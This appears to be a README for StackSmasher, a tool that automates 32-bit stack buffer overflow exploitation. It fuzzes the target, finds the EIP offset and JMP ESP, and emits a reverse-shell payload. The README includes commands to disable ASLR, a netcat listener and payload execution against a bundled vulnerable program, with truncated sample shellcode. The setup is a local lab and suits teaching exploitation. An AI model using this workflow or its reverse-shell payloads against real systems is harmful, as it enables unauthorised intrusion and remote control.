# StackSmasher

## Description
StackSmasher is an application which automatically performs a stack based buffer overflow on the target application. Currently it only supports attacking a vulnerable application through the application run time arguments. However, future modifications are to support various application inputs such as standard input and tcp input.

It will rerun the application many times to fuzz the input until a segmentation fault occurs. It will then find the offset of EIP, as well as the address of a JMP ESP instructions.

Finally it builds the final payload and outputs it.

## Modes
The application has two modes, verbose which outputs the information it has found as well as the exploit as a python script. The other mode is exploit mode which only outputs the exploit payload.

## Limitations
Various settings must be disabled for this to work including DEP, NX, and ASLR. ASLR needs to be done manually using the following script. This application also only works against 32 bit applications.

### Disable ASLR
```sh
sudo bash -c "echo 0 > /proc/sys/kernel/randomize_va_space"
```

### Enable ASLR
```sh
sudo bash -c "echo 2 > /proc/sys/kernel/randomize_va_space"
```

## Compiling

To compile the applications as 32 bit, you may need to install gcc-multilib.
```sh
sudo apt-get install gcc-multilib
```

Compile all applications.
```sh
make
```

## Running StackSmasher
### Verbose Mode
Running smasher in *verbose* mode with the prebuild reverse shell (127.0.0.1:1337) payload against the application *vulnerable*.

```sh
cd bin
chmod +x smasher vulnerable
./smasher verbose reverse-shell vulnerable
```

Example Output:
```sh
[-] Fuzzing EIP and finding JMP ESP...
[+] Found JMP ESP at 0x565561fe
[+] EIP found at offset 0x51e with length of 0x530
[+] python -c 'print("\x41\x41\...\xcd\x80\x00")'
```

Listen For Shell:
```sh
nc -lkp 1337
```

Executing Payload:
```sh
cd bin
./vulnerable $(python -c 'print("\x41\x41...\xcd\x80\x00")')
```

### Exploit Mode
Running smasher in *exploit* mode with the prebuild reverse shell (127.0.0.1:1337) payload against the application *vulnerable*.

Listen For Shell:
```sh
nc -lkp 1337
```

Executing Payload:
```sh
./vulnerable $(./smasher exploit reverse-shell vulnerable)
```

![StackSmasher](https://user-images.githubusercontent.com/31845045/108642265-06a30800-749c-11eb-88bb-40d9aa6c987b.png)
![Reverse Shell](https://user-images.githubusercontent.com/31845045/108642230-e4a98580-749b-11eb-8243-b90a4280ded4.png)
